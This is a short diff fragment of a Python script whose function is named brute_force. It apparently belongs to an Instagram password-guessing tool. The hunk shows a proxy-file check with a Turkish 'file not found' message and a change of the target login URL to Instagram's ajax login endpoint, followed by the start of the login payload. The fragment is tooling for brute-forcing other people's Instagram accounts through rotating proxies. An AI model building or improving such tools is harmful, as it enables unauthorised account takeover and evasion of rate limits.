@@ -92,7 +92,7 @@ def brute_force():
         print("Proxy dosyası bulunamadı!")
         sys.exit(1)
     
-    login_url = "https://www.instagram.com/accounts/login/"
+    login_url = "https://www.instagram.com/accounts/login/ajax"
     
     login_data = {
         'username': username,
